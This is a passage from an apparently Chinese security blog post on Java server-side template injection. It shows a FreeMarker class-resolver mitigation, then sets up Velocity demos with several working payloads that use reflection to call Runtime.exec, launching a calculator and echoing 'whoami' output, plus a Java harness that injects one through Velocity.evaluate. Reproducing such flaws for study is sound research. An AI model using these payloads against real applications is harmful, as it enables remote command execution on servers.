class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.getVersion());<br>        <span class="hljs-comment">//2.设置模板所在的目录</span><br>        configuration.setDirectoryForTemplateLoading(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources&quot;</span>));<br>        <span class="hljs-comment">//3.设置字符集</span><br>        configuration.setDefaultEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">//4.加载模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> configuration.getTemplate(<span class="hljs-string">&quot;exec_poc1.ftl&quot;</span>);<br><br>        <span class="hljs-comment">// 增加elements安全过滤</span><br>        configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br><br>        <span class="hljs-comment">//5.创建数据模型</span><br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;张三&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;欢迎来到我的博客！&quot;</span>);<br>        <span class="hljs-comment">//6.创建Writer对象</span><br>        <span class="hljs-type">Writer</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources/exec_poc1.html&quot;</span>));<br>        <span class="hljs-comment">//7.输出</span><br>        template.process(map, out);<br>        <span class="hljs-comment">//8.关闭Writer对象</span><br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p>
<ol>
<li><p>UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p>
</li>
<li><p>SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。</p>
</li>
<li><p>ALLOWS_NOTHING_RESOLVER：不能解析任何类。</p>
</li>
</ol>
<p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
<h2 id="Velocity-SSTI"><a href="#Velocity-SSTI" class="headerlink" title="Velocity SSTI"></a>Velocity SSTI</h2><p>主要参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_5">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p>
<p>​				  <a target="_blank" rel="noopener" href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></p>
<h3 id="Velocity基本语法"><a href="#Velocity基本语法" class="headerlink" title="Velocity基本语法"></a>Velocity基本语法</h3><p><code>#</code> 关键字<br>Velocity关键字都是使用 <code>#</code>开头的，如 <code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code> 等<br><code>$</code>变量<br>Velocity变量都是使用$开头的，如：<code>$name</code>、<code>$msg</code><br><code>&#123;&#125;</code>变量<br>Velocity对于需要明确表示的Velocity变量，可以使用 <code>&#123;&#125;</code> 将变量包含起来。<br><code>！</code>变量<br>如果某个Velocity变量不存在，那么页面中就会显示<code>$xxx</code>的形式，为了避免这种形式，可以在变量名称前加上！。如页面中含有<code>$msg</code>，如果msg有值，将显示msg的值；如果不存在就会显示<code>$msg</code>。这是我们不希望看到的，为了把不存在的变量显示为空白，可以使用<code>$!msg</code>。</p>
<p>此处的攻击面还是以文件上传和模板编写为主</p>
<h3 id="Velocity-SSTI漏洞风险面poc"><a href="#Velocity-SSTI漏洞风险面poc" class="headerlink" title="Velocity SSTI漏洞风险面poc"></a>Velocity SSTI漏洞风险面poc</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="web程序中弹出msg"><a href="#web程序中弹出msg" class="headerlink" title="web程序中弹出msg"></a>web程序中弹出msg</h5><p>写一个Demo</p>
<p>新建一个Maven项目，引入Velocity依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.velocity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>velocity-engine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在resource目录下创建模板文件，以.vm后缀命名</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>hello , $&#123;name&#125; !<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>主程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;外部输入的消息&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>模板文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #if($msg)<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;$!msg&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    #end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>运行主程序后可以看到模板成功注入，主程序将前台页面的显示写在html文件中，可以看到网页会弹出消息</p>
<p><img src="/img/ssti(java)/ssti18.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><h6 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #set($e=&quot;e&quot;)<br>$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;Calc&quot;)<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>mac命令为open -a Calculator</p>
<p>运行主程序后看到成功弹出计算器</p>
<p><img src="/img/ssti(java)/ssti19.png" srcset="/img/loading.gif" lazyload></p>
<h6 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set($x=&#x27;&#x27;)##<br>#set($rt = $x.class.forName(&#x27;java.lang.Runtime&#x27;))##<br>#set($chr = $x.class.forName(&#x27;java.lang.Character&#x27;))##<br>#set($str = $x.class.forName(&#x27;java.lang.String&#x27;))##<br>#set($ex=$rt.getRuntime().exec(&#x27;whoami&#x27;))##<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())##<br>#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>注入命令需要网页有回显位，或者将回显数据注入到一个文件中</p>
<p>如此处构造主程序会合并数据到模板</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>tpl.merge(context, fw);<br></code></pre></td></tr></table></figure>

<p>看到回显</p>
<p><img src="/img/ssti(java)/ssti20.png" srcset="/img/loading.gif" lazyload></p>
<h6 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h6><p>控制程序中有执行命令语句，编写poc让其执行并输出数据</p>
<p>主程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/Velocity_test/src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>模板文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set ($e=&quot;exp&quot;)<br>#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))<br>#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))<br>#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))<br>#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))<br>#set($scan=$constructor.newInstance($input).useDelimiter(&quot;/A&quot;))<br>#if($scan.hasNext())<br>    $scan.next()<br>#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>运行主程序后看到回显数据</p>
<p><img src="/img/ssti(java)/ssti21.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="evaluate触发"><a href="#evaluate触发" class="headerlink" title="evaluate触发"></a>evaluate触发</h5><p>evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的评估。用户输入通过HttpServletRequest对象获取，并放入VelocityContext中进行渲染。</p>
<p>接下来简单分析一下velocity存在漏洞的风险代码原理</p>
<p>主程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;外部攻击者可控输入&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br>		<span class="hljs-comment">//初始化velocity引擎</span><br>        Velocity.init();<br>        <span class="hljs-comment">//创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">//向容器中放入数据</span><br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>模拟注入攻击</p>
<p>将payload传入username</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;#set($e=/&quot;</span>e/<span class="hljs-string">&quot;)/n&quot;</span> +<br>                <span class="hljs-string">&quot;$e.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>Calc/<span class="hljs-string">&quot;)&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><br>        Velocity.init();<br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payload分析</p>
